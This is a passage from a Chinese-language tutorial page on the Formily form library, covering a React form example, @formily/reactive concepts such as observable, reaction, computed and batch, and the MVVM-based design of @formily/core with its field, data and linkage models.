class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><span class="hljs-keyword">import</span> &#123; createForm &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@formily/core&#x27;</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">FormProvider</span>, <span class="hljs-title class_">FormConsumer</span>, <span class="hljs-title class_">Field</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@formily/react&#x27;</span><br><span class="hljs-keyword">import</span> &#123;<br>  <span class="hljs-title class_">FormItem</span>,<br>  <span class="hljs-title class_">FormLayout</span>,<br>  <span class="hljs-title class_">Input</span>,<br>  <span class="hljs-title class_">FormButtonGroup</span>,<br>  <span class="hljs-title class_">Submit</span>,<br>&#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@formily/antd&#x27;</span><br><br><br><span class="hljs-keyword">const</span> form = <span class="hljs-title function_">createForm</span>()<br><br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> () =&gt; &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">FormProvider</span> <span class="hljs-attr">form</span>=<span class="hljs-string">&#123;form&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">FormLayout</span> <span class="hljs-attr">layout</span>=<span class="hljs-string">&quot;vertical&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Field</span></span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;input&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;输入框&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">required</span></span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">initialValue</span>=<span class="hljs-string">&quot;Hello world&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">decorator</span>=<span class="hljs-string">&#123;[FormItem]&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">component</span>=<span class="hljs-string">&#123;[Input]&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">FormLayout</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">FormConsumer</span>&gt;</span></span><br><span class="language-xml">        &#123;() =&gt; (</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">div</span></span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;&#123;</span></span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">marginBottom:</span> <span class="hljs-attr">20</span>,</span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">padding:</span> <span class="hljs-attr">5</span>,</span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">border:</span> &#x27;<span class="hljs-attr">1px</span> <span class="hljs-attr">dashed</span> #<span class="hljs-attr">666</span>&#x27;,</span></span><br><span class="hljs-tag"><span class="language-xml">            &#125;&#125;</span></span><br><span class="hljs-tag"><span class="language-xml">          &gt;</span></span><br><span class="language-xml">            实时响应：&#123;form.values.input&#125;</span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        )&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">FormConsumer</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">FormButtonGroup</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Submit</span> <span class="hljs-attr">onSubmit</span>=<span class="hljs-string">&#123;console.log&#125;</span>&gt;</span>提交<span class="hljs-tag">&lt;/<span class="hljs-name">Submit</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">FormButtonGroup</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">FormProvider</span>&gt;</span></span><br>  )<br>&#125;<br></code></pre></td></tr></table></figure><p>从以上例子中，我们可以学到很多东西：</p><ul><li><p><a href="https://core.formilyjs.org/zh-CN/api/entry/create-form">createForm</a>用来创建表单核心领域模型，它是作为<a href="https://core.formilyjs.org/guide/mvvm">MVVM</a>设计模式的标准 ViewModel</p></li><li><p><a href="https://react.formilyjs.org/zh-CN/api/components/form-provider">FormProvider</a>组件是作为视图层桥接表单模型的入口，它只有一个参数，就是接收 createForm 创建出来的 Form 实例，并将 Form 实例以上下文形式传递到子组件中</p></li><li><p><a href="https://antd.formilyjs.org/zh-CN/components/form-layout">FormLayout</a>组件是用来批量控制<a href="https://antd.formilyjs.org/zh-CN/components/form-item">FormItem</a>样式的组件，这里我们指定布局为上下布局，也就是标签在上，组件在下</p></li><li><p>Field</p><p>组件是用来承接普通字段的组件</p><ul><li>name 属性，标识字段在表单最终提交数据中的路径</li><li>title 属性，标识字段的标题<ul><li>如果 decorator 指定为 FormItem，那么在 FormItem 组件中会默认以接收 title 属性作为标签</li><li>如果指定为某个自定义组件，那么 title 的消费方则由自定义组件来承接</li><li>如果不指定 decorator，那么 title 则不会显示在 UI 上</li></ul></li><li>required 属性，必填校验的极简写法，标识该字段必填<ul><li>如果 decorator 指定为 FormItem，那么会自动出现星号提示，同时校验失败也会有对应的状态反馈，这些都是 FormItem 内部做的默认处理</li><li>如果 decorator 指定为自定义组件，那么对应的 UI 样式则需要自定义组件实现方自己实现</li><li>如果不指定 decorator，那么 required 只是会阻塞提交，校验失败不会有任何 UI 反馈。</li></ul></li><li>initialValue 属性，代表字段的默认值</li><li>decorator 属性，代表字段的 UI 装饰器，通常我们都会指定为 FormItem<ul><li>注意 decorator 属性传递的是数组形式，第一个参数代表指定组件类型，第二个参数代表指定组件属性</li></ul></li><li>component 属性，代表字段的输入控件，可以是 Input，也可以是 Select，等等<ul><li>注意 component 属性传递的是数组形式，第一个参数代表指定组件类型，第二个参数代表指定组件属性</li></ul></li></ul></li><li><p><a href="https://react.formilyjs.org/zh-CN/api/components/form-consumer">FormConsumer</a>组件是作为响应式模型的响应器而存在，它核心是一个 render props 模式，在作为 children 的回调函数中，会自动收集所有依赖，如果依赖发生变化，则会重新渲染，借助 FormConsumer 我们可以很方便的实现各种计算汇总的需求</p></li><li><p><a href="https://antd.formilyjs.org/zh-CN/components/form-button-group">FormButtonGroup</a>组件作为表单按钮组容器而存在，主要负责按钮的布局</p></li><li><p><a href="https://antd.formilyjs.org/zh-CN/components/submit">Submit</a>组件作为表单提交的动作触发器而存在，其实我们也可以直接使用 form.submit 方法进行提交，但是使用 Submit 的好处是不需要每次都在 Button 组件上写 onClick 事件处理器，同时它还处理了 Form 的 loading 状态，如果 onSubmit 方法返回一个 Promise，且 Promise 正在 pending 状态，那么按钮会自动进入 loading 状态</p></li></ul><h2 id="4、基础核心库：Reactive"><a href="#4、基础核心库：Reactive" class="headerlink" title="4、基础核心库：Reactive"></a>4、基础核心库：Reactive</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>@formily&#x2F;reactive 的核心思想是参考 <a href="https://mobx.js.org/">Mobx</a> 的，那为什么要重新造轮子呢？</p><p>主要有 4 点原因：</p><ul><li>mobx 不支持 action 内部进行依赖收集</li><li>mobx 的 observable 函数不支持过滤 react node,moment,immutable 之类的特殊对象</li><li>mobx 的 observable 函数会自动将函数变成 action</li><li>mobx-react-lite 的 observer 不支持 React 并发渲染</li></ul><p>基于以上原因，formily 不得不重新造轮子，不过该轮子是强依赖 Proxy 的，也就是不支持 IE 浏览器，当然，重新造轮子也有它的好处：</p><ul><li>把控性更强，可以为 formily 场景做更深的优化定制</li><li>不用考虑 Mobx 的历史包袱，代码可以更干净</li><li>如果 Mobx 版本 Break Change 或者存在安全漏洞，对 Formily 无影响</li></ul><h3 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h3><h5 id="Observable"><a href="#Observable" class="headerlink" title="Observable"></a>Observable</h5><p>observable 是响应式编程模型中最重要的一块，它的核心概念就是：</p><p>一个 observable 对象，字面意思是可订阅对象，<strong>我们通过创建一个可订阅对象，在每次操作该对象的属性数据的过程中，会自动通知订阅者</strong>，@formily&#x2F;reactive 创建 observable 对象主要是通过 ES Proxy 来创建的，它可以做到完美劫持数据操作。</p><p>我们在@formily&#x2F;reactive 中主要用以下几个 API 来创建 observable 对象：</p><ul><li>observable 函数创建深度 observable 对象<ul><li>observable.deep 函数创建深劫持 observable 对象</li><li>observable.shallow 函数创建浅劫持 observable 对象</li><li>observable.computed 函数创建缓存计算器</li><li>observable.box 函数创建带 get&#x2F;set 方法的 observable 对象</li><li>observable.ref 函数创建引用级 observable 对象</li></ul></li><li>define 函数定义 observable 领域模型，可以组合 observable 函数与其静态属性(比如 observable.computed)函数完成领域模型的定义。</li><li>model 函数定义自动 observable 领域模型，它会将 getter setter 属性包装为 computed 计算属性，将函数包装为 action，将其他数据属性用 observable 包装(注意这里是深劫持)。</li></ul><h5 id="Reaction"><a href="#Reaction" class="headerlink" title="Reaction"></a>Reaction</h5><p>reaction 在响应式编程模型中，它就相当于是可订阅对象的订阅者，它接收一个 tracker 函数，这个函数在执行的时候，如果函数内部有对 observable 对象中的某个属性进行<strong>读操作</strong>(依赖收集)，那当前 reaction 就会与该属性进行一个绑定(依赖追踪)，直到该属性在其他地方发生了<strong>写操作</strong>，就会触发 tracker 函数重复执行，用一张图表示：</p><p><img src="https://img.alicdn.com/imgextra/i4/O1CN01DQMGUL22mFICDsKfY_!!6000000007162-2-tps-1234-614.png" alt="img"></p><p>可以看到从订阅到派发订阅，其实是一个封闭的循环状态机，每次 tracker 函数执行的时候都会重新收集依赖，依赖变化时又会重新触发 tracker 执行。所以，如果一旦我们不想再订阅 reaction 了，一定要手动 dispose，否则会内存泄漏。</p><p>在@formily&#x2F;reactive 中的我们主要是使用以下几个 API 来创建 reaction:</p><ul><li>autorun 创建一个自动执行的响应器</li><li>reaction 创建一个可以实现脏检查的响应器</li><li>Tracker 创建一个依赖追踪器，需要用户手动执行追踪</li></ul><h5 id="Computed"><a href="#Computed" class="headerlink" title="Computed"></a>Computed</h5><p>computed 在响应式编程模型中也是属于一个比较重要的概念，一句话表达的话，<strong>computed 是一个可以缓存计算结果的 Reaction</strong></p><p>它的缓存策略是：只要 computed 函数内部所依赖的 observable 数据发生变化，函数才会重新执行计算，否则永远读取缓存结果</p><p>这里要求的就是 computed 函数必须是纯函数，内部依赖的数据要么是 observable 数据，要么是外部常量数据，如果是外部变量数据(非 observable)，那如果外部变量数据发生变化，computed 是不会重新执行计算的。</p><h5 id="Batch"><a href="#Batch" class="headerlink" title="Batch"></a>Batch</h5><p>前面有讲到@formily&#x2F;reactive 是基于 Proxy 劫持来实现的响应式编程模型，所以任何一个原子操作都会触发 Reaction 执行，这样明显是浪费了计算资源的，比如我们有一个函数内部是对多个 observable 属性进行操作的：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ts"><span class="hljs-keyword">import</span> &#123; observable, autorun &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@formily/reactive&#x27;</span><br><span class="hljs-keyword">const</span> obs = <span class="hljs-title function_">observable</span>(&#123;&#125;)<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">handler</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  obs.<span class="hljs-property">aa</span> = <span class="hljs-number">123</span><br>  obs.<span class="hljs-property">bb</span> = <span class="hljs-number">321</span><br>&#125;<br><br><br><span class="hljs-title function_">autorun</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obs.<span class="hljs-property">aa</span>, obs.<span class="hljs-property">bb</span>)<br>&#125;)<br><br><br><span class="hljs-title function_">handler</span>()<br></code></pre></td></tr></table></figure><p>这样就会执行 3 次打印，autorun 默认执行一次，加上 obs.aa 赋值执行一次，obs.bb 赋值执行一次，如果原子操作更多一些，那执行次数会更多，所以，我们推荐使用 batch 模式，将更新进行合并：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs ts"><span class="hljs-keyword">import</span> &#123; observable, autorun, batch &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@formily/reactive&#x27;</span><br><span class="hljs-keyword">const</span> obs = <span class="hljs-title function_">observable</span>(&#123;&#125;)<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">handler</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  obs.<span class="hljs-property">aa</span> = <span class="hljs-number">123</span><br>  obs.<span class="hljs-property">bb</span> = <span class="hljs-number">321</span><br>&#125;<br><br><br><span class="hljs-title function_">autorun</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obs.<span class="hljs-property">aa</span>, obs.<span class="hljs-property">bb</span>)<br>&#125;)<br><br><br><span class="hljs-title function_">batch</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">handler</span>()<br>&#125;)<br></code></pre></td></tr></table></figure><p>当然，我们也可以使用 action 进行高阶包装：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ts"><span class="hljs-keyword">import</span> &#123; observable, autorun, action &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@formily/reactive&#x27;</span><br><span class="hljs-keyword">const</span> obs = <span class="hljs-title function_">observable</span>(&#123;&#125;)<br><span class="hljs-keyword">const</span> handler = action.<span class="hljs-title function_">bound</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  obs.<span class="hljs-property">aa</span> = <span class="hljs-number">123</span><br>  obs.<span class="hljs-property">bb</span> = <span class="hljs-number">321</span><br>&#125;)<br><br><br><span class="hljs-title function_">autorun</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obs.<span class="hljs-property">aa</span>, obs.<span class="hljs-property">bb</span>)<br>&#125;)<br><br><br><span class="hljs-title function_">handler</span>()<br></code></pre></td></tr></table></figure><p>最终执行次数就是 2 次了，即便 handler 内部的操作再多也还是 2 次</p><h3 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h3><p>在使用@formily&#x2F;reactive 的时候，我们只需要注意以下几点即可：</p><ul><li>尽量少用 observable&#x2F;observable.deep 进行深度包装，不是非不得已就多用 observable.ref&#x2F;observable.shallow，这样性能会更好</li><li>领域模型中多用 computed 计算属性，它可以智能缓存计算结果</li><li>虽然批量操作不是必须的，但是尽量多用 batch 模式，这样可以减少 Reaction 执行次数</li><li>使用 autorun&#x2F;reaction 的时候，一定记得调用 dispose 释放函数(也就是调用函数所返回的二阶函数)，否则会内存泄漏</li></ul><h2 id="5、基础核心库：core"><a href="#5、基础核心库：core" class="headerlink" title="5、基础核心库：core"></a>5、基础核心库：core</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><h5 id="UI-无关"><a href="#UI-无关" class="headerlink" title="UI 无关"></a>UI 无关</h5><p>因为 @formily&#x2F;core 作为一个独立的包而存在，它的核心意义是将领域模型从 UI 框架中抽离出来，同时给开发者带来了以下两个直观收益：</p><ol><li>可以方便 formily 开发者从 UI 与逻辑的耦合关系中释放出来，提升代码可维护性；</li><li>可以让 formily 拥有跨终端，跨框架的能力，不管你是 React 用户，Vue 用户还是 Angular 用户，都能享受到 formily 的领域模型带来的提效。</li></ol><h5 id="超高性能"><a href="#超高性能" class="headerlink" title="超高性能"></a>超高性能</h5><p>借助 @formily&#x2F;reactive，@formily&#x2F;core 天然获得了依赖追踪，高效更新，按需渲染的能力，不管是在 React 下，还是 Vue&#x2F;Angular 下，不管是字段频繁输入，还是字段联动，都能给用户带来 O(1)的性能体验，开发者无需关心性能优化的事情，只需要专注于业务逻辑实现即可。</p><h5 id="领域模型-1"><a href="#领域模型-1" class="headerlink" title="领域模型"></a>领域模型</h5><p>如果把表单问题做分解，其实我们可以分解出：</p><ul><li>数据管理问题</li><li>字段管理问题</li><li>校验管理问题</li><li>联动管理问题</li></ul><p>这几个方向的问题其实都可以作为领域级问题去解决，每一个领域问题，其实都是非常复杂的问题，在 Formily 中，全部一一给您突破解决了，所以您只需要专注于业务逻辑即可。</p><h5 id="智能提示"><a href="#智能提示" class="headerlink" title="智能提示"></a>智能提示</h5><p>因为 formily 是完全的 Typescript 项目，所以用户在 VSCode 或 WebStorm 等上开发可以获得最大化的智能提示体验</p><p><img src="https://img.alicdn.com/imgextra/i2/O1CN01yiREHk1X95KJPPz1c_!!6000000002880-2-tps-2014-868.png" alt="img"></p><h5 id="状态可观测"><a href="#状态可观测" class="headerlink" title="状态可观测"></a>状态可观测</h5><p>安装 <a href="https://chrome.google.com/webstore/detail/formily-devtools/kkocalmbfnplecdmbadaapgapdioecfm?hl=zh-CN">FormilyDevtools</a> 可以实时观测模型状态变化，排查问题</p><p><img src="https://img.alicdn.com/imgextra/i4/O1CN01DSci5h1rAGfRafpXw_!!6000000005590-2-tps-2882-1642.png" alt="img"></p><h3 id="核心架构"><a href="#核心架构" class="headerlink" title="核心架构"></a>核心架构</h3><p><img src="https://img.alicdn.com/imgextra/i4/O1CN01HlrsLS1hQAJnihhh1_!!6000000004271-55-tps-2431-2037.svg" alt="img"></p><p>从上图中我们可以看到 Formily 内核其实是一个 @formily&#x2F;reactive 领域模型。</p><p>实际消费领域模型则主要是依赖 @formily&#x2F;reactive 的 响应器 机制做依赖追踪来消费。</p><p>我们可以在响应器(Reactions)中消费 Form&#x2F;Field&#x2F;ArrayField&#x2F;ObjectField&#x2F;VoidField 模型中的任意属性，依赖的属性发生变化，响应器就会重复执行。</p><p>从而实现了表单层面的 Reactive 编程模型。</p><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><h4 id="MVVM"><a href="#MVVM" class="headerlink" title="MVVM"></a>MVVM</h4><p><strong>MVVM</strong>（<strong>Model–view–viewmodel</strong>）是一种 OOP 软件架构模式，它的核心是将我们的应用程序的逻辑与视图做分离，提升代码可维护性与应用健壮性。我们可以用一张图来描述：</p><p><img src="https://img.alicdn.com/imgextra/i3/O1CN01jiB7h723ZFf0lBCTo_!!6000000007269-55-tps-1244-432.svg" alt="img"></p><p>解释一下就是，View(视图层)负责维护 UI 结构与样式，同时负责与 ViewModel(视图模型)做数据绑定，这里的数据绑定关系是双向的，也就是，ViewModel(视图模型)的数据发生变化，会触发 View(视图层)的更新，同时视图层的数据变化又会触发 ViewModel(视图模型)的变化。Model 则更偏实际业务数据处理模型。ViewModel 和 Model 都是充血模型，两者都注入了不同领域的业务逻辑，比如 ViewModel 的业务逻辑更偏视图交互层的领域逻辑，而 Model 的业务逻辑则更偏业务数据的处理逻辑。</p><p>那么，Formily 解决方案在 MVVM 中应该是什么样的定位呢？</p><p>很明显，Formily 它提供了 View 和 ViewModel 两层能力，View 则是@formily&#x2F;react @formily&#x2F;vue，专门用来与@formily&#x2F;core 做桥接通讯的，所以，@formily&#x2F;core 的定位就是 ViewModel 层，</p><p>那 Model 层在哪里呢？</p><p>当然就是我们的实际业务代码层了，这一层 formily 就不会管了，所以这一层，用户到底是用 OOP 模式维护了一个 Model 还是用 FP 模式维护了一系列的业务逻辑函数集，formily 都不关心。</p><p>所以，这也使得 formily 对业务的入侵性很低，因为 formily 的目标是减少用户设计 ViewModel 的成本，让用户更加专注于业务逻辑的实现。</p><h4 id="FP-架构"><a href="#FP-架构" class="headerlink" title="FP 架构"></a>FP 架构</h4><p>还记得之前 React 团队用了一个最简单的表达式 <strong>UI &#x3D; fn(State)</strong> 来表达整个 React 体系吗？这样的函数式表达 UI，非常简单清晰，那会不会和 MVVM 模式产生冲突呢？</p><p>并不会冲突，因为在 MVVM 的模式中，View 和 ViewModel 的关系其实就约等于 <strong>UI &#x3D; fn(State)</strong> ，因为 ViewModel 是一个注入逻辑的充血模型，它与 <strong>fn(State)</strong> 都能达到相同的目标，只是它是更 OOP 的表达，只是<strong>fn(State)</strong> 是一种更加函数式的表达，将状态作为贫血模型而存在，通过一个又一个的函数，对贫血模型做 Immutable 式的更新，最终反应到 UI 上。</p><p>所以，从逻辑和数据分离的角度上来看，函数式表达更加清晰，只是函数式表达要求所有数据都是 Immutable 的。所以在性能要求高的场景上，采用函数式模型收益并不会太大，当然只是在 js 语言下是这样的。相反，MVVM 这种模式对数据的要求更多的是 Reactive 数据，也就是可以通过引用式操作数据的响应式数据模型，这样可以做到精确监控数据变化，最终反应到 UI 上。</p><p>所以，在表单场景上，MVVM 模式性能优势会更好一些，最重要的是，目前大多数存活了几十年的 GUI 产品，几乎都是不约而同的使用 MVVM，这么看来，在前端领域，函数式体系会更偏学术化一些，从实际对业务的收益来看的话，MVVM 还是首选。</p><h4 id="表单模型"><a href="#表单模型" class="headerlink" title="表单模型"></a>表单模型</h4><p>整个表单模型很大很复杂，分解下来其实核心是以下几个子模型：</p><ul><li>字段管理模型</li><li>字段模型</li><li>数据模型</li><li>联动模型</li><li>路径系统</li></ul><p>下面具体来讲一下表单模型是如何管理的。</p><h5 id="字段管理模型"><a href="#字段管理模型" class="headerlink" title="字段管理模型"></a>字段管理模型</h5><p>字段管理模型，主要包含：</p><ul><li>字段添加</li><li>字段查询</li><li>导入字段集</li><li>导出字段集</li><li>清空字段集</li></ul><p>字段添加</p><p>主要通过 createField&#x2F;createArrayField&#x2F;createObjectField&#x2F;createVoidField 方法来创建字段，如果字段已经存在，则不会重复创建</p><p>字段查询</p><p>主要通过 query 方法来查询字段，query 方法可以传入字段的路径或者正则表达式来匹配字段。</p><p>因为字段路径的详细规则还是比较复杂的，在后面的<a href="https://core.formilyjs.org/api/entry/form-path">路径系统</a>篇中会详细讲解。</p><p>然后调用 query 方法会返回一个 Query 对象，Query 对象中可以有批量遍历所有字段的 forEach&#x2F;map&#x2F;reduce 方法，也可以有只取查询到的第一个字段的 take 方法，同时还有直接读取字段属性的 get 方法，还有可以深层读取字段属性的 getIn 方法，两个方法的差别就是前者可以有智能提示，后者没有提示，所以推荐用户都用 get 方法。</p><p>导入字段集</p><p>主要通过 setFormGraph 来导入字段集，入参格式是一个扁平对象格式，key 是字段的绝对路径，value 是字段的状态，使用该 API 主要在一些需要做时间旅行的场景，将 Immutable 字段状态导入至表单模型中。</p><p>导出字段集</p><p>主要通过 getFormGraph 来导出字段集，导出格式是一个扁平对象格式，key 是字段的绝对路径，value 是字段的状态，与导入字段集入参一致，因为返回的数据是一个 Immutable 的数据，所以是可以完全做持久化存储的，方便时间旅行。</p><p>清空字段集</p><p>主要通过 clearFormGraph 来清空字段集。</p><h5 id="字段模型"><a href="#字段模型" class="headerlink" title="字段模型"></a>字段模型</h5><p>字段模型主要包含了：</p><ul><li>Field 模型，主要负责管理非自增型字段状态，比如 Input&#x2F;Select&#x2F;NumberPicker&#x2F;DatePicker 这些组件</li><li>ArrayField 模型，主要负责管理自增列表字段状态，可以对列表项进行增删移动的。</li><li>ObjectField 模型，主要负责管理自增对象字段状态，可以对对象的 key 做增删操作。</li><li>VoidField 模型，主要负责管理虚字段状态，虚字段是一种不会污染表单数据的节点存在，但是它可以控制它的子节点显示隐藏，交互模式。</li></ul><p>因为字段模型非常复杂，所以会在后面的<a href="https://core.formilyjs.org/guide/field">字段模型</a>篇中详细讲解。</p><h5 id="数据模型"><a href="#数据模型" class="headerlink" title="数据模型"></a>数据模型</h5><p>表单数据模型，formily 之前的版本或多或少都会存在一些边界问题，在 2.x 中重新梳理了一版，才真正把之前的遗留问题突破掉了。</p><p>数据模型主要包含：</p><ul><li>表单值(values)管理</li><li>表单默认值(initialValues)管理</li><li>字段值(value)管理</li><li>字段默认值(initialValue)管理</li><li>值与默认值的选择合并策略</li></ul><p>表单值管理，其实就是一个对象结构的 values 属性，只是它是一个 @formily&#x2F;reactive observable 属性，同时借助了 @formily&#x2F;reactive 的深度 observer 能力，监听了它任意属性变化，如果发生变化，便会触发 onFormValuesChange 的生命周期钩子。</p><p>同理，默认值管理其实也是一个对象结构的 initialValues 属性，同样会深度监听属性变化，触发 onFormInitialValues 的生命周期钩子。</p><p>字段值管理，是在每个数据型字段的 value 属性上体现的，formily 会给每个字段维护一个叫 path 的数据路径属性，然后 value 的读写，都是对顶层表单的 values 进行读写，这样保证了字段的值与表单的值是绝对幂等的，同理字段默认值也一样。</p><p>总结一下，<strong>值的管理，都是在顶层表单上管理的，字段的值与表单的值是通过 path 来实现的绝对幂等。</strong></p><p>值与默认值的差别其实就在于表单重置的时候，字段是否会重置为默认值状态</p><p>值与默认值的选择合并策略</p><p>平时我们在业务开发的过程中，总会有数据回显的需求，这份数据一般都是作为异步默认值，作为详情页面的话，都还好，但是作为编辑页面的话，就会存在一些问题了：</p><p><strong>存在冲突</strong></p><p>比如表单值为<code>&#123;xx:123&#125;</code>，表单默认值为<code>&#123;xx:321&#125;</code>，这里的策略是：</p><ul><li>如果xx没有相应的字段模型，代表仅仅只是冗余数据，用户无法修改<ul><li>如果表单值是先赋值，默认值是后赋值的，那么默认值直接覆盖表单值，这种场景适用于异步数据回显场景，不同业务状态，回显的默认数据不一样，最终提交数据<code>&#123;xx:321&#125;</code></li><li>如果默认值先赋值，表单值是后赋值的，那么表单值直接覆盖默认值，这种场景适用于同步默认值，最终提交数据<code>&#123;xx:123&#125;</code></li></ul></li><li>如果xx有字段模型<ul><li>如果表单值先赋值，默认值是后赋值的<ul><li>如果当前字段被用户修改过(modified 为 true)，那么默认值不能覆盖表单值，最终提交数据<code>&#123;xx:123&#125;</code></li><li>如果当前字段没有被用户修改过(modified 为 false)，那么默认值会直接覆盖字段值，这种场景适用于异步数据回显场景，不同业务状态，回显的默认数据不一样，最终提交数据<code>&#123;xx:321&#125;</code></li></ul></li><li>如果默认值先赋值，表单值是后赋值的，那么表单值直接覆盖默认值，这种场景适用于同步默认值，最终提交数据<code>&#123;xx:123&#125;</code></li></ul></li></ul><p><strong>不存在冲突</strong></p><p>比如表单值为<code>&#123;xx:123&#125;</code>，表单默认值为<code>&#123;yy:321&#125;</code>，这里的策略是直接合并。</p><p>总结一下，值与默认值的选择合并策略，<strong>核心是看该字段是否被用户修改过，一切以用户为准，如果没被用户修改过就以赋值顺序为准</strong></p><p>这里提到的默认值，是可以重复赋值的，说的也是在重复赋值的过程中，要不要舍弃值的问题。</p><h5 id="校验模型"><a href="#校验模型" class="headerlink" title="校验模型"></a>校验模型</h5><p>表单校验模型核心是对数据的合法性校验，然后将校验结果管理起来，所以校验模型主要包含了：</p><ul><li>校验规则管理</li><li>校验结果管理</li></ul><p>因为校验模型隶属于字段模型，所以会在后面的<a href="https://core.formilyjs.org/guide/field#%E6%A0%A1%E9%AA%8C%E8%A7%84%E5%88%99">字段模型</a>篇中详细讲解</p><h5 id="联动模型"><a href="#联动模型" class="headerlink" title="联动模型"></a>联动模型</h5><p>联动模型在 formily1.x 中核心是走的主动式联动模型，大致用一句表达式来表达就是：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ts"><span class="hljs-title function_">setFieldState</span>(<span class="hljs-title class_">Subscribe</span>(<span class="hljs-title class_">FormLifeCycle</span>, <span class="hljs-title class_">Selector</span>(<span class="hljs-title class_">Path</span>)), <span class="hljs-title class_">TargetState</span>)<br></code></pre></td></tr></table></figure><p>解释下就是，任意一次联动，都是基于表单的某个生命周期钩子去触发指定路径下字段的状态，这样的模型能解决很多问题，但是它也有个很明显的问题，就是在多对一联动的场景下，需要同时监听多个字段变化去控制某个字段的状态，这样对用户而言，实现成本还是比较高的，特别是实现一些计算器联动需求，代码量剧增。当然，对于一对多场景，反而这种模型又是最高效的。</p><p>所以，在 formily2.x 中，在主动联动模型上新增了被动联动模型，同样是一句表达式表达：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ts"><span class="hljs-title function_">subscribe</span>(<span class="hljs-title 